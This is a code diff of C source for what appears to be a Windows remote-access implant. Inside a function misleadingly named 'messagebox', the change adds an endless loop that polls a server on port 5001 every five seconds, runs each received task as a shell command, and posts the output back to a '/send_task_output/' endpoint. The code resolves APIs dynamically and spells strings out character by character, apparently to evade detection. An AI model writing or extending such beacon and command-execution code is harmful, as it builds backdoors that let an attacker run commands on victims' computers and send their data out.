@@ -351,9 +351,10 @@ CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
     DWORD availableBytes = 0;
     DWORD actuallyRead = 0;
     LPDWORD lpActuallyRead = &actuallyRead;
-  
+    BOOL readSuccess ;
+
     while(((WINHTTPQUERYDATAAVAILABLE)api->WinHttpQueryDataAvailable)(hRequest, &availableBytes) && availableBytes != 0) {
-        BOOL readSuccess = ((WINHTTPREADDATA)api->WinHttpReadData)(
+        readSuccess = ((WINHTTPREADDATA)api->WinHttpReadData)(
             hRequest,
             (LPVOID)(cpBuffer+bufferIndexChange),
             availableBytes,
@@ -366,7 +367,9 @@ CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
         bufferIndexChange += availableBytes/sizeof(WCHAR);
     }
 
-    return cpBuffer;
+    if (readSuccess)
+    { return cpBuffer; }
+    return NULL;
 }
 
 void PostRequest(PAPI api, WCHAR* server, INTERNET_PORT port, const WCHAR* endpoint, const CHAR* data) {
@@ -1030,38 +1033,46 @@ void messagebox() {
     WCHAR* fullPath = myConcat(api, tasksPath, uuid);
     INTERNET_PORT port = 5001;
 
-    CHAR* jsonResponse = GetRequest(api, wServer, port, fullPath);
-    CHAR fString[] = {L'%', L's', 0};
-    ((PRINTF)api->printf)(fString, jsonResponse);
-
+    CHAR* jsonResponse;
     CHAR* taskId = {0};
     CHAR* agentUuid = {0};
     CHAR* task;
-    task = parseJsonTask(api, jsonResponse, &taskId, &agentUuid);
-
     CHAR* taskOutput;
+    DWORD sizeOfOutput;
     CHAR jsonFormat[] = {
     '{', '"', 't', 'a', 's', 'k', '_', 'i', 'd', '"', ':', ' ', '%', 's', ',', 
     ' ', '"', 'a', 'g', 'e', 'n', 't', '_', 'u', 'u', 'i', 'd', '"', ':', ' ', '"', 
     '%', 's', '"', ',', ' ', '"', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p', 
     'u', 't', '"', ':', ' ', '"', '%', 's', '"', '}', '\0'
     };
-
-    DWORD sizeOfOutput;
-    taskOutput = myTrim(((RUNCMD)PEsgStdApi->RunCmd)(task, &sizeOfOutput), '\n');
-    DWORD totalJsonSize = myStrlenA(jsonFormat) + sizeOfOutput + myStrlenA(taskId) + myStrlenA(agentUuid);
-    CHAR* json = (CHAR*)((CALLOC)api->calloc)(totalJsonSize, sizeof(CHAR));
-
     WCHAR sendOutputPath[] = {'/', 's', 'e', 'n', 'd', '_', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p', 'u', 't', '/', 0};
+    DWORD totalJsonSize;
+    CHAR* json;
 
-    CHAR hi[] = {'h', 'i', 0};
-    int written = ((SNPRINTF)api->snprintf)(json, totalJsonSize*sizeof(CHAR), jsonFormat, taskId, agentUuid, hi);
-    PostRequest(api, wServer, port, myConcat(api, sendOutputPath, uuid), json);
+    while (TRUE)
+    {
+        jsonResponse = GetRequest(api, wServer, port, fullPath);
 
-    ((PRINTF)api->printf)(fString, json);
-    ((FREE)api->free)(taskOutput);
-    ((FREE)api->free)(json);
-    ((FREE)api->free)(jsonResponse);
-    //((FREE)api->free)(pEsgStdDll);
+        if (jsonResponse == NULL)
+        {
+            ((SLEEP)api->Sleep)(5000);
+            continue;
+        }
+        task = parseJsonTask(api, jsonResponse, &taskId, &agentUuid);
+
+        taskOutput = myTrim(((RUNCMD)PEsgStdApi->RunCmd)(task, &sizeOfOutput), '\n');
+        totalJsonSize = myStrlenA(jsonFormat) + sizeOfOutput + myStrlenA(taskId) + myStrlenA(agentUuid);
+        json = (CHAR*)((CALLOC)api->calloc)(totalJsonSize, sizeof(CHAR));
+
+
+        int written = ((SNPRINTF)api->snprintf)(json, totalJsonSize*sizeof(CHAR), jsonFormat, taskId, agentUuid, taskOutput);
+        PostRequest(api, wServer, port, myConcat(api, sendOutputPath, uuid), json);
+
+        ((FREE)api->free)(taskOutput);
+        ((FREE)api->free)(json);
+        ((FREE)api->free)(jsonResponse);
+
+        ((SLEEP)api->Sleep)(5000);
+    }
 }
 
